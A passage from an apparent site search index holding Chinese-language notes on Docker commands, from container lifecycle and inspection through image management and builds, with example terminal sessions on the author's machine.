容器内的进程必须处于前台运行状态，否则容器就会直接退出 示例 使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx: docker run --name mynginx -d nginx:latest 使用镜像nginx:latest以后台模式启动一个容器,并将容器的80端口映射到主机随机端口: docker run -P -d nginx:latest 使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data: docker run -p 80:80 -v /data:/data -d nginx:latest 绑定容器的 8080 端口，并将其映射到本地主机 127.0.0.1 的 80 端口上: $ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash 使用镜像nginx:latest以交互模式启动一个容器,在容器内执行/bin/bash命令: runoob@runoob:~$ docker run -it nginx:latest /bin/bash root@b8573233d675:/# start/stop/restart docker start :启动一个或多个已经被停止的容器 docker stop :停止一个运行中的容器 docker restart :重启容器 语法 docker start [OPTIONS] CONTAINER [CONTAINER...] docker stop [OPTIONS] CONTAINER [CONTAINER...] docker restart [OPTIONS] CONTAINER [CONTAINER...] 示例 启动名为 qinglong 的容器 yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Exited ( 137 ) 44 hours ago qinglong yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker start qinglong qinglong yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Up 5 seconds 0 .0.0.0:5700->5700/tcp qinglong yanque@yanquedembp ~ % 停止名为 qinglong 的容器 yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Up 5 seconds 0 .0.0.0:5700->5700/tcp qinglong yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker stop qinglong qinglong yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES yanque@yanquedembp ~ % 重启名为 qinglong 的容器 yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker restart qinglong qinglong yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Up 3 seconds 0 .0.0.0:5700->5700/tcp qinglong yanque@yanquedembp ~ % kill docker kill :杀掉一个运行中的容器 语法 docker kill [OPTIONS] CONTAINER [CONTAINER...] OPTIONS说明: -s 向容器发送一个信号 示例 杀掉运行中的容器 qinglong yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Up 26 seconds 0 .0.0.0:5700->5700/tcp qinglong yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker kill -s KILL qinglong qinglong yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES yanque@yanquedembp ~ % rm docker rm : 删除一个或多个容器。 语法 docker rm [OPTIONS] CONTAINER [CONTAINER...] OPTIONS说明: -f 通过 SIGKILL 信号强制删除一个运行中的容器。 -l 移除容器间的网络连接，而非容器本身。 -v 删除与容器关联的卷。 示例 强制删除容器 db01、db02: docker rm -f db01 db02 移除容器 nginx01 对容器 db01 的连接，连接名 db: docker rm -l db 删除容器 nginx01, 并删除容器挂载的数据卷: docker rm -v nginx01 删除所有已经停止的容器: docker rm $(docker ps -a -q) pause/unpause docker pause :暂停容器中所有的进程。 docker unpause :恢复容器中所有的进程。 语法 docker pause CONTAINER [CONTAINER...] docker unpause CONTAINER [CONTAINER...] OPTIONS说明: -s 向容器发送一个信号 示例 暂停数据库容器db01提供服务: docker pause db01 恢复数据库容器 db01 提供服务: docker unpause db01 create docker create : 创建一个新的容器但不启动它, 用法同 docker run 语法 docker create [OPTIONS] IMAGE [COMMAND] [ARG...] 用法同 docker run 示例 使用docker镜像 yanquer/kali:config_apt_list2 创建一个容器,并将容器命名为 mykali yanque@yanquedembp ~ % docker images REPOSITORY TAG IMAGE ID CREATED SIZE yanquer/kali config_apt_list2 24b7cbbe11fb 2 days ago 236MB yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker create -t -p 60000:5900 -p 60001:5901 -p 60002:5902 --name mykali yanquer/kali:config_apt_list2 WARNING: The requested image's platform (linux/arm64) does not match the detected host platform (linux/amd64) and no specific platform was requested fa15654fc7d19605dbc2415e09d279bfc1d898efae6b1ff8f87f27940aa94cd8 yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fa15654fc7d1 yanquer/kali:config_apt_list2 \"bash\" About a minute ago Created mykali exec docker exec : 在运行的容器中执行命令 语法 docker exec [OPTIONS] CONTAINER COMMAND [ARG...] OPTIONS说明: -d 分离模式, 在后台运行 -i 即使没有附加也保持STDIN 打开 -t 分配一个伪终端 示例 调用容器 mykali 执行 ls /usr : yanque@yanquedembp ~ % docker exec -it mykali ls /usr bin games include lib libexec local sbin share src 容器开启一个交互模式终端: yanque@yanquedembp ~ % docker exec -it mykali /bin/bash ┌──(root㉿fa15654fc7d1)-[/] └─# 注解 执行指令时的对象, 可以是容器名, 也可以是容器id","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-life-cycle-management.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-life-cycle-management.html"},{"title":"容器操作","text":"ps 列出容器 语法 docker ps [OPTIONS] OPTIONS说明 -a :显示所有的容器，包括未运行的。 -f :根据条件过滤显示的内容。 --format :指定返回值的模板文件。 -l :显示最近创建的容器。 -n :列出最近创建的n个容器。 --no-trunc :不截断输出。 -q :静默模式，只显示容器编号。 -s :显示总的文件大小。 示例 列出所有在运行的容器信息。 yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 输出详情介绍： CONTAINER ID: 容器 ID。 IMAGE: 使用的镜像。 COMMAND: 启动容器时运行的命令。 CREATED: 容器的创建时间。 STATUS: 容器状态。 STATUS 状态有7种： created（已创建） restarting（重启中） running（运行中） removing（迁移中） paused（暂停） exited（停止） dead（死亡） PORTS: 容器的端口信息和使用的连接类型（tcpudp）。 NAMES: 自动分配的容器名称。 列出最近创建的5个容器信息。 yanque@yanquedembp ~ % docker ps -n 5 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-ent…\" 2 weeks ago Exited ( 137 ) 3 hours ago qinglong 列出所有创建的容器ID。 yanque@yanquedembp ~ % docker ps -a -q de1871a5ebeb inspect docker inspect : 获取容器/镜像的元数据 语法 docker inspect [OPTIONS] NAME|ID [NAME|ID...] OPTIONS说明： -f :指定返回值的模板文件。 -s :显示总的文件大小。 --type :为指定类型返回JSON。 示例 获取 python镜像 元数据 yanque@yanquedembp mytest % yanque@yanquedembp mytest % docker inspect python [ { \"Id\" : \"sha256:26acbad26a2ca1387add4d4d07957e88d18930fb47580a90313de939873c75d8\" , \"RepoTags\" : [ \"python:latest\" ] , \"RepoDigests\" : [ \"python@sha256:497a6f39e10440ab20242b56693fbc2d0549b515cd585328a702720ff4db6bd5\" ] , \"Parent\" : \"\" , \"Comment\" : \"\" , \"Created\" : \"2017-09-13T14:27:41.728086539Z\" , \"Container\" : \"0018f3382d15704565819e20c299fe0346dcbc3cfc48b17e528dfbc3c068d433\" , \"ContainerConfig\" : { \"Hostname\" : \"0018f3382d15\" , \"Domainname\" : \"\" , \"User\" : \"\" , \"AttachStdin\" : false, \"AttachStdout\" : false, \"AttachStderr\" : false, \"Tty\" : false, \"OpenStdin\" : false, \"StdinOnce\" : false, \"Env\" : [ \"PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" , \"LANG=C.UTF-8\" , \"GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\" , \"PYTHON_VERSION=3.6.2\" , \"PYTHON_PIP_VERSION=9.0.1\" ] , \"Cmd\" : [ \"/bin/sh\" , \"-c\" , \"#(nop) \" , \"CMD [\\\"python3\\\"]\" ] , \"ArgsEscaped\" : true, \"Image\" : \"sha256:3cc8e180255b46231404d2ae57c380015063812b3da3254909555d4dd7f3b905\" , \"Volumes\" : null, \"WorkingDir\" : \"\" , \"Entrypoint\" : null, \"OnBuild\" : [] , \"Labels\" : {} } , \"DockerVersion\" : \"17.06.2-ce\" , \"Author\" : \"\" , \"Config\" : { \"Hostname\" : \"\" , \"Domainname\" : \"\" , \"User\" : \"\" , \"AttachStdin\" : false, \"AttachStdout\" : false, \"AttachStderr\" : false, \"Tty\" : false, \"OpenStdin\" : false, \"StdinOnce\" : false, \"Env\" : [ \"PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" , \"LANG=C.UTF-8\" , \"GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\" , \"PYTHON_VERSION=3.6.2\" , \"PYTHON_PIP_VERSION=9.0.1\" ] , \"Cmd\" : [ \"python3\" ] , \"ArgsEscaped\" : true, \"Image\" : \"sha256:3cc8e180255b46231404d2ae57c380015063812b3da3254909555d4dd7f3b905\" , \"Volumes\" : null, \"WorkingDir\" : \"\" , \"Entrypoint\" : null, \"OnBuild\" : [] , \"Labels\" : null } , \"Architecture\" : \"amd64\" , \"Os\" : \"linux\" , \"Size\" : 689734109 , \"VirtualSize\" : 689734109 , \"GraphDriver\" : { \"Data\" : { \"LowerDir\" : \"/var/lib/docker/overlay2/c26d04f12ee93cf5d1856f63eb61dca2b866417b8d73cec1e9baa5860fa3cd61/diff:/var/lib/docker/overlay2/9245eeb0a8f0f9412452d02e23633ebb762288083c15392e57385332ee5793ef/diff:/var/lib/docker/overlay2/d448eb624cefd5b3af0fb2e5780df0538a39304bf30402568136f23c905d5f2c/diff:/var/lib/docker/overlay2/4d10354dd281b1040ed8b9f8924d978f8b6f3599a39e82ff87c0b08052cd2ade/diff:/var/lib/docker/overlay2/ebec34fd45fac8ec2858f01593d7d3117e21b6c97786bbea01742e705fd8a6b3/diff:/var/lib/docker/overlay2/edd8ed31051b48638c8b05dd8fdaecd65e245ef296b9ddbba98da08b53c35cd6/diff:/var/lib/docker/overlay2/5732de9fa78c685f662b1715a712c6651c54878ae67a955981ccdb1c3c4b5024/diff\" , \"MergedDir\" : \"/var/lib/docker/overlay2/e96aa157f1fe9bfad88b1597c7c821a18c8a5b507977fe0fbbc9fab22846af18/merged\" , \"UpperDir\" : \"/var/lib/docker/overlay2/e96aa157f1fe9bfad88b1597c7c821a18c8a5b507977fe0fbbc9fab22846af18/diff\" , \"WorkDir\" : \"/var/lib/docker/overlay2/e96aa157f1fe9bfad88b1597c7c821a18c8a5b507977fe0fbbc9fab22846af18/work\" } , \"Name\" : \"overlay2\" } , \"RootFS\" : { \"Type\" : \"layers\" , \"Layers\" : [ \"sha256:18f9b4e2e1bcd5abe381a557c44cba379884c88f6049564f58fd8c10ab5733df\" , \"sha256:d70ce8b0dad684a9e2294b64afa06b8848db950c109cde60cb543bf16d5093c9\" , \"sha256:ecd70829ec3d4a56a3eca79cec39d5ab3e4d404bf057ea74cf82682bb965e119\" , \"sha256:7381522c58b0db7134590fdcbc3b648865325f638427f69a474adc22e6b918af\" , \"sha256:1e96ffb4a81f9b0fbb625448b7d0b6b6a38b0b9eb891473320a90df91ded2acf\" , \"sha256:ec71859e4a965f98cb08cd85ef5ea52753fd26f811ba556264b2b08bb7b911b6\" , \"sha256:24b78eec42f88fb03c35a48f28301b0d2a26598c7795101184177ed00998880b\" , \"sha256:6bcbbdeefa0a25adf0cdab0004b772c21f16eb119965c8588ef100414d01b53f\" ] } , \"Metadata\" : { \"LastTagTime\" : \"0001-01-01T00:00:00Z\" } } ] yanque@yanquedembp mytest % top docker top :查看容器中运行的进程信息，支持 ps 命令参数 语法 docker top [OPTIONS] CONTAINER [ps OPTIONS] 注解 容器运行时不一定有/bin/bash终端来交互执行top命令，而且容器还不一定有top命令，可以使用docker top来实现查看 container (容器) 中正在运行的进程。 示例 查看容器 mykali 的进程信息。 yanque@yanquedembp mytest % docker top mykali UID PID PPID C STIME TTY TIME CMD root 3177 3152 0 03 :19 ? 00 :00:00 /usr/bin/qemu-aarch64 /usr/bin/bash bash root 3419 3152 0 06 :36 ? 00 :00:00 /usr/bin/qemu-aarch64 /bin/bash /bin/bash yanque@yanquedembp mytest % 查看所有运行容器的进程信息。 for i in ` docker ps | grep Up | awk '{print $1}' ` ; do echo \\ && docker top $i ; done attach docker attach :连接到正在运行中的容器。 语法 docker attach [OPTIONS] CONTAINER 要attach上去的容器必须正在运行，可以同时连接上同一个 container 来共享屏幕（与screen命令的attach类似）。 官方文档中说attach后可以通过CTRL-C来 detach ，但实际上经过我的测试，如果 container 当前在运行bash，CTRL-C自然是当前行的输入，没有退出；如果 container 当前正在前台运行进程，如输出nginx的 access .log日志，CTRL-C不仅会导致退出容器，而且还stop了。这不是我们想要的， detach 的意思按理应该是脱离容器终端，但容器依然运行。好在attach是可以带上--sig-proxy=false来确保CTRL-D或CTRL-C不会关闭容器。 示例 容器mynginx将访问日志指到标准输出，连接到容器查看访问信息。 runoob@runoob:~$ docker attach --sig-proxy = false mynginx 192 .168.239.1 - - [ 10 /Jul/2016:16:54:26 +0000 ] \"GET / HTTP/1.1\" 304 0 \"-\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36\" \"-\" events docker events : 从服务器获取实时事件 语法 docker events [OPTIONS] OPTIONS说明 -f ：根据条件过滤事件； --since ：从指定的时间戳后显示所有事件; --until ：流水时间显示到指定的时间为止； 示例 显示docker 镜像为 python 2022年10月1日后的相关事件。 yanque@yanquedembp mytest % docker events --since = \"1672204137\" -f \"image\" = \"python\" 2022 -12-28T15:30:25.569291322+08:00 image pull python:latest ( name = python ) 2022 -12-28T15:30:41.440253288+08:00 container create 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( image = python, name = objective_burnell ) 2022 -12-28T15:30:41.446677063+08:00 container attach 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( image = python, name = objective_burnell ) 2022 -12-28T15:30:42.106046916+08:00 container start 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( image = python, name = objective_burnell ) 2022 -12-28T15:30:42.216118892+08:00 container die 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( exitCode = 0 , image = python, name = objective_burnell ) 2022 -12-28T15:31:02.434099427+08:00 container create 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( image = python, name = peaceful_jones ) 2022 -12-28T15:31:02.437918597+08:00 container attach 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( image = python, name = peaceful_jones ) 2022 -12-28T15:31:02.709044368+08:00 container start 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( image = python, name = peaceful_jones ) 2022 -12-28T15:31:02.784000217+08:00 container die 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( exitCode = 0 , image = python, name = peaceful_jones ) 2022 -12-28T15:31:11.441315766+08:00 container create 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( image = python, name = nifty_hawking ) 2022 -12-28T15:31:11.446211552+08:00 container attach 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( image = python, name = nifty_hawking ) 2022 -12-28T15:31:11.725841917+08:00 container start 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( image = python, name = nifty_hawking ) 2022 -12-28T15:31:11.734199431+08:00 container resize 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( height = 58 , image = python, name = nifty_hawking, width = 166 ) 2022 -12-28T15:31:38.000185842+08:00 container die 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( exitCode = 0 , image = python, name = nifty_hawking ) 2022 -12-28T15:31:41.223429147+08:00 container create 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( image = python, name = fervent_hofstadter ) 2022 -12-28T15:31:41.227702518+08:00 container attach 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( image = python, name = fervent_hofstadter ) 2022 -12-28T15:31:41.447076652+08:00 container start 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( image = python, name = fervent_hofstadter ) 2022 -12-28T15:31:41.455181214+08:00 container resize 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( height = 58 , image = python, name = fervent_hofstadter, width = 166 ) 2022 -12-28T15:31:51.146816850+08:00 container die 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( exitCode = 0 , image = python, name = fervent_hofstadter ) &#94;C% yanque@yanquedembp mytest % 如果指定的时间是到秒级的，需要将时间转成时间戳。如果时间为日期的话，可以直接使用，如--since=\"2022-10-01\"。 logs docker logs : 获取容器的日志 语法: docker logs [OPTIONS] CONTAINER OPTIONS说明 -f 跟踪日志输出 --since 显示某个开始时间的所有日志 -t 显示时间戳 --tail 仅列出最新N条容器日志 示例 跟踪查看容器 mykali 的日志输出 yanque@yanquedembp mytest % docker logs -f mykali ┌── ( root㉿fa15654fc7d1 ) - [ / ] &#94;C% wait docker wait : 阻塞运行直到容器停止，然后打印出它的退出代码 语法 docker wait [OPTIONS] CONTAINER [CONTAINER...] 示例 docker wait CONTAINER export docker export : 将文件系统作为一个tar归档文件导出到STDOUT。 语法 docker export [OPTIONS] CONTAINER OPTIONS说明 -o :将输入内容写到文件。 示例 将容器 mykali 按日期保存为tar文件。 yanque@yanquedembp test % docker export -o mykali-`date +%Y%m%d`.tar mykali yanque@yanquedembp test % ls 1.txt c++ dd mykali-20221228.tar yanque@yanquedembp test % ls -lh mykali-20221228.tar -rw-------@ 1 yanque staff 231M 12 28 16:20 mykali-20221228.tar yanque@yanquedembp test % port docker port 用于列出指定的容器的端口映射，或者查找将 PRIVATE_PORT NAT 到面向公众的端口 语法: docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]] 示例 查看容器 mykali 的端口映射情况 yanque@yanquedembp test % docker port mykali 5900 /tcp -> 0 .0.0.0:60000 5901 /tcp -> 0 .0.0.0:60001 5902 /tcp -> 0 .0.0.0:60002 stats docker stats : 显示容器资源的使用情况，包括：CPU、内存、网络 I/O 等 语法 docker stats [OPTIONS] [CONTAINER...] OPTIONS说明 --all , -a :显示所有的容器，包括未运行的。 --format (格式) :指定返回值的模板文件。 --no-stream :展示当前状态就直接退出了，不再实时更新。 --no-trunc :不截断输出。 示例 列出所有在运行的容器信息。 yanque@yanquedembp test % docker stats CONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDS fa15654fc7d1 mykali 0 .00% 23 .63MiB / 7 .675GiB 0 .30% 1 .51kB / 0B 6 .15MB / 4 .1kB 4 输出详情介绍 CONTAINER ID 与 NAME: 容器 ID 与名称。 CPU % 与 MEM %: 容器使用的 CPU 和内存的百分比。 MEM USAGE / LIMIT (限制) : 容器正在使用的总内存，以及允许使用的内存总量。 NET I/O: 容器通过其网络接口发送和接收的数据量。 BLOCK I/O: 容器从主机上的块设备读取和写入的数据量。 PIDs: 容器创建的进程或线程数。 根据容器等 ID 或名称现实信息, 支持多个: yanque@yanquedembp test % docker stats mykali CONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDS fa15654fc7d1 mykali 0 .00% 23 .63MiB / 7 .675GiB 0 .30% 1 .51kB / 0B 6 .15MB / 4 .1kB 4 以 JSON 格式输出： yanque@yanquedembp test % docker stats mykali --no-stream --format \"{{json .}}\" { \"BlockIO\" : \"6.15MB / 4.1kB\" , \"CPUPerc\" : \"0.00%\" , \"Container\" : \"mykali\" , \"ID\" : \"fa15654fc7d1\" , \"MemPerc\" : \"0.30%\" , \"MemUsage\" : \"23.63MiB / 7.675GiB\" , \"Name\" : \"mykali\" , \"NetIO\" : \"1.58kB / 0B\" , \"PIDs\" : \"4\" } yanque@yanquedembp test % 输出指定的信息： yanque@yanquedembp test % docker stats --no-stream --all --format \"table {{.Container}}\\t{{.CPUPerc}}\\t{{.MemUsage}}\" mykali CONTAINER CPU % MEM USAGE / LIMIT mykali 0 .00% 23 .63MiB / 7 .675GiB","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-operation.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-operation.html"},{"title":"容器rootfs命令","text":"commit 从容器创建一个新的镜像 语法 docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]] OPTIONS说明： -a :提交的镜像作者； -c :使用Dockerfile指令来创建镜像； -m :提交时的说明文字； -p :在commit时，将容器暂停。 示例 将容器 ea0a6afe23a3 保存为新的镜像, 设置仓库名为 kali , tag为 config_apt_list2 , 并添加提交人信息和说明信息。 ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker commit -a 'yanque' -m 'kali image with config ustc apt list' ea0a6afe23a3 kali:config_apt_list2 sha256:24b7cbbe11fb587bf850dad2f2dc1b46412a2c73c2b55a00716dabb1b7832204 ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images kali:config_apt_list2 REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 56 seconds ago 236MB cp docker cp :用于容器与主机之间的数据拷贝。 语法 docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|- docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH OPTIONS说明： -L :保持源目标中的链接 示例 将主机 README.en.md 拷贝到容器 mykali 的 /root 目录下。 yanque@yanquedembp mytest % docker cp README.en.md mykali:/root yanque@yanquedembp mytest % ls -lh README.en.md -rw-r--r-- 1 yanque staff 816B 10 22 02 :12 README.en.md yanque@yanquedembp mytest % yanque@yanquedembp mytest % docker exec -it mykali /bin/bash ┌── ( root㉿fa15654fc7d1 ) - [ / ] └─# ┌── ( root㉿fa15654fc7d1 ) - [ ~ ] └─# cd ~ && ls -lh total 4 .0K -rw-r--r-- 1 501 dialout 816 Oct 21 18 :12 README.en.md ┌── ( root㉿fa15654fc7d1 ) - [ ~ ] └─# diff docker diff : 检查容器里文件结构的更改 语法 docker diff [OPTIONS] CONTAINER 示例 查看容器 mykali 的文件结构更改。 yanque@yanquedembp ~ % docker diff mykali C /root C /root/.bash_history yanque@yanquedembp ~ %","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-rootfs-command.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-rootfs-command.html"},{"title":"本地镜像管理","text":"images docker images : 列出本地镜像 语法: docker images [OPTIONS] [REPOSITORY[:TAG]] OPTIONS说明： -a 列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）； --digests 显示镜像的摘要信息； -f 显示满足条件的镜像； --format 指定返回值的模板文件； 比如只显示ID: docker images --format \"{{.ID}}\" 以表格形式美化显示(默认就是表格): docker images --format \"table {{.ID}}\\t{{.Repository}}\\t{{.Tag}}\" --no-trunc 显示完整的镜像信息； -q 只显示镜像ID。 示例 显示本地镜像列表 yanque@yanquedembp test % docker images REPOSITORY TAG IMAGE ID CREATED SIZE yanquer/kali config_apt_list2 24b7cbbe11fb 2 days ago 236MB whyour/qinglong latest a5db91bf7c98 2 weeks ago 322MB kalilinux/kali-rolling latest c2fadbc65f8d 11 months ago 126MB python latest 26acbad26a2c 5 years ago 690MB java latest d23bdf5b1b1b 5 years ago 643MB 显示仓库为 yanquer/kali 镜像信息以及摘要信息 yanque@yanquedembp test % docker images --digests yanquer/kali REPOSITORY TAG DIGEST IMAGE ID CREATED SIZE yanquer/kali config_apt_list2 sha256:161c0ffd5197fa4a4a88d00e53ccf43500da3b075f1793d9a3722c6c0bdf15ff 24b7cbbe11fb 2 days ago 236MB rmi 删除image 语法 docker rmi [OPTIONS] IMAGE [IMAGE...] OPTIONS说明： -f :强制删除； --no-prune :不移除该镜像的过程镜像，默认移除； 示例 强制删除本地镜像 kali:config_apt_list1。 ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 3 minutes ago 236MB kali config_apt_list1 167a6460c75d 9 minutes ago 236MB kalilinux/kali-rolling latest ae8b160e1ecb 9 hours ago 140MB ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker rmi kali:config_apt_list1 Untagged: kali:config_apt_list1 ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 6 minutes ago 236MB kalilinux/kali-rolling latest ae8b160e1ecb 9 hours ago 140MB tag 标记本地镜像，将其归入某一仓库。 可用于更新名称然后删除旧的. 语法 docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG] 示例 将镜像 kali:config_apt_list1 标记为 yanquer/kali:config_apt_list2 镜像。 ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 6 minutes ago 236MB kalilinux/kali-rolling latest ae8b160e1ecb 9 hours ago 140MB ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker tag 24b7cbbe11fb yanquer/kali:config_apt_list2 ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 25 minutes ago 236MB yanquer/kali config_apt_list2 24b7cbbe11fb 25 minutes ago 236MB kalilinux/kali-rolling latest ae8b160e1ecb 10 hours ago 140MB ( dev_venv ) yanque@yanquedeMacBook-Pro project % build docker build 命令用于使用 Dockerfile 创建镜像。 语法: docker build [OPTIONS] PATH | URL | - OPTIONS说明： --build-arg 设置镜像创建时的变量 --build-arg=[] ； --cpu-shares 设置 cpu 使用权重； --cpu-period 限制 CPU CFS周期； --cpu-quota 限制 CPU CFS配额； --cpuset-cpus 指定使用的CPU id； --cpuset-mems 指定使用的内存 id； --disable-content-trust 忽略校验，默认开启； -f 指定要使用的Dockerfile路径； --force-rm 设置镜像过程中删除中间容器； --isolation 使用容器隔离技术； --label 设置镜像使用的元数据, --label=[] ； -m 设置内存最大值； --memory-swap 设置 Swap (交换) 的最大值为内存+ Swap (交换) ，\"-1\"表示不限 Swap (交换) ； --no-cache 创建镜像的过程不使用缓存； --pull 尝试去更新镜像的新版本； --quiet , -q 安静模式，成功后只输出镜像 ID； --rm 设置镜像成功后删除中间容器； --shm-size 设置/dev/shm的大小，默认值是64M； -u limit Ulimit配置。 --squash 将 Dockerfile 中所有的操作压缩为一层。 --tag , -t 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。 --network 默认 default。在构建期间设置RUN指令的网络模式 示例 使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。 docker build -t runoob/ubuntu:v1 . 使用URL github.com/creack/docker-firefox 的 Dockerfile 创建镜像。 docker build github.com/creack/docker-firefox 也可以通过 -f Dockerfile 文件的位置： $ docker build -f /path/to/a/Dockerfile . 在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回： $ docker build -t test/myapp . Sending build context to Docker daemon 2 .048 kB Error response from daemon: Unknown instruction: RUNCMD history docker history : 查看指定镜像的创建历史 语法 docker history [OPTIONS] IMAGE OPTIONS说明： -H :以可读的格式打印镜像大小和日期，默认为true； --no-trunc :显示完整的提交记录； -q :仅列出提交记录ID。 示例 查看本地镜像 yanquer/kali:config_apt_list2 的创建历史 yanque@yanquedembp test % docker history yanquer/kali:config_apt_list2 IMAGE CREATED CREATED BY SIZE COMMENT 24b7cbbe11fb 2 days ago bash 526B kali image with config ustc apt list <missing> 2 days ago bash 96 .3MB <missing> 3 days ago /bin/sh -c #(nop) CMD [\"bash\"] 140MB <missing> 3 days ago /bin/sh -c #(nop) ENV LANG=C.UTF-8 0B <missing> 3 days ago /bin/sh -c #(nop) ADD file:cc482abaa0a3211e9… 0B <missing> 3 days ago /bin/sh -c #(nop) LABEL org.opencontainers.i… 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URL… 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URL… 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URL… 0B <missing> 3 days ago /bin/sh -c #(nop) ARG 